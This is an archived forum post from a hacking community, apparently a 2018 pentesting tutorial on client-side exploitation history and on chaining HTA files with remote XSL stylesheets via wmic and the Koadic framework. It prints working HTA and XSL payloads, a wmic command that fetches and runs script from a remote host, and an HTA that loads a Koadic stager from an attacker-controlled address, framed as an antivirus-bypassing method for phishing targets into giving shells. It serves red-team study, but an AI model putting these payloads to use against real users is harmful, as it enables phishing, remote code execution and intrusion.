<!DOCTYPE html>
<html lang="en">
  <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>Clientside Exploitation in 2018 - How Pentesting Has Changed - Malware - 0x00sec - The Home of the Hacker</title>
    <meta name="description" content="Exploitation in 2018 - How Pentesting Has Changed
Hi 0x00sec! This is the next installment of my pentesting series. If you missed my last two articles, you can read the first one here and the second one here. They are he&amp;hellip;">
    <meta name="generator" content="Discourse 3.6.0.beta2-latest - https://github.com/discourse/discourse version 3b1964f3ed8bdc2f181e2abccb1b116e4b814db5">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.html">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.html">
<meta name="theme-color" media="all" content="#171616">

<meta name="color-scheme" content="dark">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
<link rel="canonical" href="7356.html" />

<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">

    
    <link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4.css_%3b%20filename_%3dUTF-8%27%27color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" class="light-scheme" data-scheme-id="15"/>

<link href="../../stylesheets/common_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27common_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common"  />

  <link href="../../stylesheets/mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile"  />
  <link href="../../stylesheets/desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop"  />



    <link href="../../stylesheets/chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="chat"  />
    <link href="../../stylesheets/checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="checklist"  />
    <link href="../../stylesheets/discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-cakeday"  />
    <link href="../../stylesheets/discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-details"  />
    <link href="../../stylesheets/discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-lazy-videos"  />
    <link href="../../stylesheets/discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-local-dates"  />
    <link href="../../stylesheets/discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-narrative-bot"  />
    <link href="../../stylesheets/discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-presence"  />
    <link href="../../stylesheets/discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-solved"  />
    <link href="../../stylesheets/discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-templates"  />
    <link href="../../stylesheets/discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-topic-voting"  />
    <link href="../../stylesheets/docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="docker_manager"  />
    <link href="../../stylesheets/footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="footnote"  />
    <link href="../../stylesheets/poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="poll"  />
    <link href="../../stylesheets/spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="spoiler-alert"  />
    <link href="../../stylesheets/chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="chat_mobile"  />
    <link href="../../stylesheets/discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-solved_mobile"  />
    <link href="../../stylesheets/discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-topic-voting_mobile"  />
    <link href="../../stylesheets/chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="chat_desktop"  />
    <link href="../../stylesheets/discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="discourse-topic-voting_desktop"  />
    <link href="../../stylesheets/poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="poll_desktop"  />

  <link href="../../stylesheets/common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960db.css_%3b%20filename_%3dUTF-8%27%27common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960dba97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common_theme" data-theme-id="57" data-theme-name="0x00sec-v2"/>
    <link href="../../stylesheets/mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38.css_%3b%20filename_%3dUTF-8%27%27mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile_theme" data-theme-id="4" data-theme-name="mobile chrome"/>
    <link href="../../stylesheets/desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96.css_%3b%20filename_%3dUTF-8%27%27desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2"/>

    <link rel="stylesheet" href="../../../external.html?link=https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="../../../external.html?link=https://s3.amazonaws.com/0x00sec/highlight.pack.js" nonce="yb0ALw9rAGUPSdILPCLJQxiar"></script>
<script defer="" src="../../theme-javascripts/05954ff525aceb8daa8b585f92d758d311ae7077.js_%3b%20filename_%3dUTF-8%27%2705954ff525aceb8daa8b585f92d758d311ae7077a97f.js?__ws=d.clarkee.co.uk" data-theme-id="40" nonce="yb0ALw9rAGUPSdILPCLJQxiar"></script>
    
        <link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Clientside Exploitation in 2018 - How Pentesting Has Changed&#39;" href="7356.rss" />
    <meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/2X/5/5f5d0bdcf36c9e70da29acfb226bf9862546d0cb.png" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/2X/5/5f5d0bdcf36c9e70da29acfb226bf9862546d0cb.png" />
<meta property="og:url" content="https://d.clarkee.co.uk/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356" />
<meta name="twitter:url" content="https://d.clarkee.co.uk/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356" />
<meta property="og:title" content="Clientside Exploitation in 2018 - How Pentesting Has Changed" />
<meta name="twitter:title" content="Clientside Exploitation in 2018 - How Pentesting Has Changed" />
<meta property="og:description" content="Exploitation in 2018 - How Pentesting Has Changed Hi 0x00sec! This is the next installment of my pentesting series. If you missed my last two articles, you can read the first one here and the second one here. They are heavily OSINT focussed, and naturally, the next article should be about active recon, however, I move in erratic ways and such the next installment is about exploitation, and specifically, how the field has changed up until now.  Please note, I am not an expert in pentesting histor..." />
<meta name="twitter:description" content="Exploitation in 2018 - How Pentesting Has Changed Hi 0x00sec! This is the next installment of my pentesting series. If you missed my last two articles, you can read the first one here and the second one here. They are heavily OSINT focussed, and naturally, the next article should be about active recon, however, I move in erratic ways and such the next installment is about exploitation, and specifically, how the field has changed up until now.  Please note, I am not an expert in pentesting histor..." />
<meta property="og:article:section" content="Malware" />
<meta property="og:article:section:color" content="F7941D" />
<meta property="og:article:tag" content="xsl" />
<meta property="og:article:tag" content="pentesting" />
<meta property="og:article:tag" content="hta" />
<meta property="og:article:tag" content="phishing" />
<meta property="og:article:tag" content="hacking" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="3 mins üïë" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="26 ‚ù§" />
<meta property="article:published_time" content="2018-07-01T20:26:51+00:00" />
<meta property="og:ignore_canonical" content="true" />


    
  </head>
  <body class="crawler ">
    <div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">
  <!--<a href="https://git.0x00sec.org" class="dow-menu">GitLab</a>  
  <a href="https://blog.0x00sec.org/irc" class="dow-menu">IRC</a>!-->
  <a href="../../../external.html?link=https://init.0x00sec.org/" class="dow-menu">Init</a>
  <a href="../../../external.html?link=https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
  <a href="../../../external.html?link=https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
    <header>
  <a href="../../index.html">0x00sec - The Home of the Hacker</a>
</header>

    <div id="main-outlet" class="wrap" role="main">
        <div id="topic-title">
    <h1>
      <a href="7356.html">Clientside Exploitation in 2018 - How Pentesting Has Changed</a>
    </h1>

      <div class="topic-category" itemscope itemtype="../../../external.html?link=http://schema.org/BreadcrumbList">
          <span itemprop="itemListElement" itemscope itemtype="../../../external.html?link=http://schema.org/ListItem">
            <a href="../../c/malware/56.html" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #F7941D'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>Malware</span>
              </span>
            </a>
            <meta itemprop="position" content="1" />
          </span>
      </div>

      <div class="topic-category">
        <div class='discourse-tags list-tags'>
            <a href='../../tag/xsl.html' class='discourse-tag' rel="tag">xsl</a>, 
            <a href='../../tag/pentesting.html' class='discourse-tag' rel="tag">pentesting</a>, 
            <a href='../../tag/hta.html' class='discourse-tag' rel="tag">hta</a>, 
            <a href='../../tag/phishing.html' class='discourse-tag' rel="tag">phishing</a>, 
            <a href='../../tag/hacking.html' class='discourse-tag' rel="tag">hacking</a>
        </div>
      </div>
  </div>

  

    <div itemscope itemtype='../../../external.html?link=http://schema.org/DiscussionForumPosting'>
      <meta itemprop='headline' content='Clientside Exploitation in 2018 - How Pentesting Has Changed'>
      <link itemprop='url' href='7356.html'>
      <meta itemprop='datePublished' content='2018-07-01T20:26:50Z'>
        <meta itemprop='articleSection' content='Malware'>
      <meta itemprop='keywords' content='xsl, pentesting, hta, phishing, hacking'>
      <div itemprop='publisher' itemscope itemtype="../../../external.html?link=http://schema.org/Organization">
        <meta itemprop='name' content='0x00sec - The Home of the Hacker'>
          <div itemprop='logo' itemscope itemtype="../../../external.html?link=http://schema.org/ImageObject">
            <meta itemprop='url' content='../../uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.html'>
          </div>
      </div>


          <div id='post_1'  class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/pry0cc.html'><span itemprop='name'>pry0cc</span></a>
                (Leader &amp; Offsec Engineer &amp; Forum Daddy)
              </span>

                <link itemprop="mainEntityOfPage" href="7356.html">

                <link itemprop="image" href="../../../0x00sec.s3.amazonaws.com/original/2X/5/5f5d0bdcf36c9e70da29acfb226bf9862546d0cb.png">

              <span class="crawler-post-infos">
                  <time  datetime='2018-07-01T20:26:51Z' class='post-time'>
                    July 1, 2018,  8:26pm
                  </time>
                  <meta itemprop='dateModified' content='2019-04-08T18:26:50Z'>
              <span itemprop='position'>1</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <h1><a name="p-26162-exploitation-in-2018-how-pentesting-has-changed-1" class="anchor" href="#p-26162-exploitation-in-2018-how-pentesting-has-changed-1"></a>Exploitation in 2018 - How Pentesting Has Changed</h1>
<p>Hi 0x00sec! This is the next installment of my pentesting series. If you missed my last two articles, you can read the first one <a href="../../../external.html?link=https://0x00sec.org/t/osint-passive-recon-and-discovery-of-assets/6715">here</a> and the second one <a href="../../../external.html?link=https://0x00sec.org/t/osint-0x02-linkedin-is-not-just-for-jobs/6774">here</a>. They are heavily OSINT focussed, and naturally, the next article should be about active recon, however, I move in erratic ways and such the next installment is about exploitation, and specifically, how the field has changed up until now.</p>
<p>Please note, I am not an expert in pentesting history, this is purely my understanding of it and has been sourced from speaking with fellow infosec professionals and my experience.</p>
<h2><a name="p-26162-the-history-2" class="anchor" href="#p-26162-the-history-2"></a>The History</h2>
<h3><a name="p-26162-new-old-school-pentesting-3" class="anchor" href="#p-26162-new-old-school-pentesting-3"></a>New, Old School Pentesting</h3>
<p>Back in the old days (post 90‚Äôs, yes, I‚Äôm young), pentesting was as easy as doing a port scan, finding a host, and then running a script against it as soon as you were able to download the module from exploit-db or similar. People who did this in the early 2000‚Äôs were able to pass as pentesters, and be proficient at it, systems were rampant with insecurities, and so getting in (generally speaking), was a straightforward feat. You also had a lot of security consulting businesses charging as little as $500 for a ‚Äúpentest‚Äù, which damaged the name of penetration testing, especially when they later got hit by more advanced threats.</p>
<h3><a name="p-26162-the-wave-of-sqli-and-appsec-4" class="anchor" href="#p-26162-the-wave-of-sqli-and-appsec-4"></a>The wave of SQLi and AppSec</h3>
<p>Then, people starting getting a little smarter, and pentesters began utilizing things like SQL Injection, XSS and other web application related security, this was nicely supplemented by the release of <a href="../../../external.html?link=https://github.com/sqlmapproject/sqlmap/wiki/History">sqlmap</a>, allowing virtually anybody to exploit blind SQL Injection vulnerabilities. Around this period, SQL Injection actually was at the top of the <a href="../../../external.html?link=https://www.owasp.org/index.php/Top_10_2010-Main">OWASP Top 10</a>, and after being exploited a wide array of times, it easily became one of the worlds most well-known application vulnerabilities. Containerisation was not really a thing, and infrastructure was still widely deployed by hand.</p>
<p>Breaking into a website was as easy as putting quotation marks on the end of the URL.</p>
<h3><a name="p-26162-picsexe-5" class="anchor" href="#p-26162-picsexe-5"></a>Pics.exe</h3>
<p>Around this time, spam emails began to circulate using cheap ploys such as attaching an executable file masquerading as a picture or a zip file. It was common to get spam emails containing something along the lines of ‚ÄúSee this funny picture of a cat!‚Äù, cat-pics.jpg.exe. Anti-virus and anti-spam were badly trained, and so getting an individual to run your exploit was quite straightforward.</p>
<h5><a name="p-26162-encoding-6" class="anchor" href="#p-26162-encoding-6"></a>Encoding</h5>
<p>As a side venture from this, encoding and packers became a popular thing, such as the renowned <code>shikata ga nai</code> encoding that came bundled with msfpayload and msfencode (which soon became msfvenom).</p>
<h5><a name="p-26162-custom-rat-era-7" class="anchor" href="#p-26162-custom-rat-era-7"></a>Custom RAT era</h5>
<p>Soon, these began to be detected easily as well, anti-virus and anti-spam were getting smarter, scanning executables and beating encoding, no longer could you just generate a metasploit payload and encode it. Now you had to make your own RAT/shell, this was a hugely productive era as Windows would run a custom compiled C++ without a hitch, and email allowed for attachment of such things without a problem.</p>
<h3><a name="p-26162-the-powershell-craze-8" class="anchor" href="#p-26162-the-powershell-craze-8"></a>The Powershell Craze</h3>
<p>Eventually, though, custom rats and encoding began to fail, antivirus got smarter, and non-signed executables started to get blocked automatically in some environments; especially in businesses. In recent years, though, (2016-2017) Powershell has become the powerhouse of pentesters looking to phish for shells. Powershell has emerged as one of the biggest clientside tools, manifesting itself in things like <a href="../../../external.html?link=https://github.com/EmpireProject/Empire">Empire</a>. Powershell was really great too, until recently..</p>
<h3><a name="p-26162-hta-and-xsl-jscript-and-vbs-9" class="anchor" href="#p-26162-hta-and-xsl-jscript-and-vbs-9"></a>HTA and XSL, JScript and VBS</h3>
<p>Microsoft released <a href="../../../external.html?link=https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf">AMSI</a>, which is bad news for pentesters phishing with PowerShell. No longer does sending a javascript/hta file loading PowerShell works. AMSI picks this stuff up immediately.</p>
<p>Luckily though, the cat and mouse game has reached a new level, and this time the mouse is winning. And this time it‚Äôs with HTA‚Äôs, XSL, and <a href="../../../external.html?link=https://github.com/zerosum0x0/koadic">Koadic</a>, and at the time of writing, this method works very very well. The main difference is that koadic uses JScript, which isn‚Äôt (yet) detected by AMSI in the same way PowerShell is.</p>
<h2><a name="p-26162-the-meat-10" class="anchor" href="#p-26162-the-meat-10"></a>The meat‚Ä¶</h2>
<p><a href="../../../external.html?link=https://twitter.com/pry0cc/status/1011351481461739520" class="onebox" target="_blank" rel="noopener">https://twitter.com/pry0cc/status/1011351481461739520</a></p>
<p>If you follow me on twitter, then you‚Äôll have seen my tweet showcasing the (not new), yet creative method of linking HTA with XSL. If you don‚Äôt follow me on twitter, go do that now, I‚Äôm <a class="mention" href="../../u/pry0cc.html">@pry0cc</a>, <a href="../../../external.html?link=https://twitter.com/pry0cc">https://twitter.com/pry0cc</a> (shameless plug).</p>
<p>If you‚Äôve been out of the loop, I‚Äôll explain to you what HTA is, what XSL is, and how it works.</p>
<p>If you‚Äôre really behind as well, you‚Äôll be clueless about sharpshooter, and absolutely stellar tool for automatically generating HTA‚Äôs. If you‚Äôre interested in using sharpshooter, check out <a href="../../../external.html?link=https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/">this</a> and then <a href="../../../external.html?link=https://www.mdsec.co.uk/2018/06/freestyling-with-sharpshooter-v1-0/">this</a>. Also, I‚Äôll give you fair warning, RUN SHARPSHOOTER WITH PYTHON2. It‚Äôll run with python3, but it‚Äôll fail.</p>
<p>Now that I‚Äôve saved all you fellow Arch users 10 hours of struggle, let‚Äôs go through how I pop shells with HTA and XSL.</p>
<h3><a name="p-26162-hta-11" class="anchor" href="#p-26162-hta-11"></a>HTA</h3>
<p>Hold up pry0cc, what are HTA‚Äôs?</p>
<p>HTA‚Äôs are short for HTML Applications. And they‚Äôre basically a way to run a HTML app in a popout view, and are treated similar to an actual application, except they‚Äôre written in HTML. They‚Äôre handled by the <code>mshta.exe</code> application. One thing that is really cool about HTA‚Äôs, is their ability to execute vbscript, which means you can execute commands.</p>
<p>Also, HTA files are opened when you double click them.</p>
<p><code>payload.hta</code></p>
<pre data-code-wrap="html"><code class="lang-html">&lt;script language="VBScript"&gt;
        set objShell = CreateObject("Wscript.Shell")
        objShell.run "calc.exe"
        self.close
&lt;/script&gt;

</code></pre>
<p>Here‚Äôs an example of a HTA file, that will work, right now, on Windows 10. The code here should be fairly self-explanatory, using VBScript it creates a <code>Wscript.Shell</code> object, and causes it to run calc.exe. Place this on any web server, and clicking this will cause it to download, and will run when you click <code>run</code>.</p>
<h3><a name="p-26162-xsl-12" class="anchor" href="#p-26162-xsl-12"></a>XSL</h3>
<p>Now this is good, but it doesn‚Äôt mean squat unless we can pop a shell, right? Well. Kind of. Luckily, we don‚Äôt have to answer that because we can! And we can do it with XSL‚Äôs.</p>
<p>XSL, aka XLST, is a <a href="../../../external.html?link=https://docs.microsoft.com/en-us/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script">Microsoft Stylesheet Script Format</a>. These payloads also contain the ability to run Microsoft scripting languages.</p>
<p><code>payload.xsl</code></p>
<pre data-code-wrap="xml"><code class="lang-xml">&lt;?xml version='1.0'?&gt;
&lt;stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0"&gt;
&lt;output method="text"/&gt;
	&lt;ms:script implements-prefix="user" language="JScript"&gt;
	&lt;![CDATA[
	var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
	]]&gt; &lt;/ms:script&gt;
&lt;/stylesheet&gt;
</code></pre>
<p>What is really cool with XSL files, is that you can load it in the windows command line remotely, with <a href="../../../external.html?link=https://en.wikipedia.org/wiki/Windows_Management_Instrumentation">WMI</a>. To test this, start a python handler locally with <code>python -m http.server</code>, and discover the url, and then run in a windows command prompt:</p>
<pre data-code-wrap="bash"><code class="lang-bash">wmic os get /FORMAT:"http://url-to/payload.xsl"
</code></pre>
<p>This should pop a Calculator. What is cool about this, is that there is a tool that generates obfuscated XSL files, and allows you to get shells with it!</p>
<h3><a name="p-26162-koadic-13" class="anchor" href="#p-26162-koadic-13"></a>Koadic</h3>
<p>I‚Äôve spoken briefly about Koadic already, so I won‚Äôt go into it too much, especially when <a href="../../../external.html?link=https://github.com/zerosum0x0/koadic">the github</a> page does such a good job.</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/5/5f5d0bdcf36c9e70da29acfb226bf9862546d0cb.png" data-download-href="/uploads/short-url/dBCI3nEQSei3NnxrsGlfoIZdbtN.png?dl=1" title="enter image description here"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/5/5f5d0bdcf36c9e70da29acfb226bf9862546d0cb.png" alt="enter image description here" width="690" height="362"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">enter image description here</span><span class="informations">907√ó477 43 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>Generate a stager using <code>use stager/js/wmic</code>, and provided you have the port specified open, you‚Äôll be able to run this wmic command to run this xsl file. One really cool attack we can do is chain this with HTA‚Äôs, to execute wmi.</p>
<p>Watch out though, we need to escape out the double quotes. Hold up, you can‚Äôt just put \ behind it, like a normal language, oh no, Microsoft had the audacity to decide that the escaping character was going to be "‚Ä¶</p>
<p>payload-2.hta</p>
<pre data-code-wrap="html"><code class="lang-html">&lt;script language="VBScript"&gt;
        set objShell = CreateObject("Wscript.Shell")
        objShell.run "wmic os get /FORMAT:""http://your-ip:9996/YjL41.xsl"""
        self.close
&lt;/script&gt;
</code></pre>
<p>It‚Äôs nothing pretty, but send this to your target, click run, boom.<br>
<div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/e/e8fffd350eea9b14985a71351b7fc2434867d56c.png" data-download-href="/uploads/short-url/xfde5w6zFGtDtlUnorwp4X6AWxC.png?dl=1" title="enter image description here"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/e/e8fffd350eea9b14985a71351b7fc2434867d56c.png" alt="enter image description here" width="519" height="378"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">enter image description here</span><span class="informations">519√ó378 24 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div><br>
<div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/1/1487548c53951800083ea6b5b36d353710d8ccac.png" data-download-href="/uploads/short-url/2VBuzJxhQxX3JNInRqYReVdpeTW.png?dl=1" title="enter image description here"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/1/1487548c53951800083ea6b5b36d353710d8ccac.png" alt="enter image description here" width="657" height="331"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">enter image description here</span><span class="informations">657√ó331 28.5 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>Now you have a shell, to do with, whatever you please! <img src="../../images/emoji/twitter/wink8e5e.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"></p>
<h3><a name="p-26162-conclusion-14" class="anchor" href="#p-26162-conclusion-14"></a>Conclusion</h3>
<p>Pentesting has come a long way, developing your own RAT‚Äôs is really not very practical anymore, except of course unless you have WMI or HTA launchers for them. Now that we have a method for bypassing AV, we can look to creating a phishing campaign with <a href="../../../external.html?link=https://hub.docker.com/r/matteoggl/gophish/">gophish</a>. In the majority of businesses, pentesters resort to using phishing as it is a very good source of shells, with a very high percentage rate.</p>
<p>If you liked this article, please like it and share it wherever you can. Tweet me at <a href="../../../external.html?link=https://twitter.com/pry0cc">@pry0cc</a>, or drop a comment saying if you loved, or hated it, and please tell me if I made a mistake and I‚Äôl be sure to correct it!</p>
<h3><a name="p-26162-whats-next-15" class="anchor" href="#p-26162-whats-next-15"></a>Whats next:</h3>
<p>That part is up to you.</p>
<aside class="quote no-group">
<blockquote>
<p>I want to know how to do:</p>
</blockquote>
</aside>
<div class="poll" data-poll-name="poll" data-poll-status="open" data-poll-type="regular">
<div class="poll-container">
<ul>
<li data-poll-option-id="53d9cc8d9a1c1b71f5127fe3728aeaee">Advanced HTA attacks with Demiguise</li>
<li data-poll-option-id="5f2514dfdb0be5a3888435ad3328c27b">Phishing Framework Setup with GoPhish</li>
<li data-poll-option-id="909d6605865c6342c8309d977fe5bc1f">Phishing Proxy Setup with Judas</li>
<li data-poll-option-id="65a072b85f6c94b4bfdb74bb3dc48efd">Domain Flyovers with Aquatone</li>
<li data-poll-option-id="b6785d79ff1a836bfae4b62c31f1ae09">Something else (comment!)</li>
</ul>
</div>
<div class="poll-info">
<div class="poll-info_counts">
<div class="poll-info_counts-count">
<span class="info-number">0</span>
<span class="info-label">voters</span>
</div>
</div>
</div>
</div>
            </div>

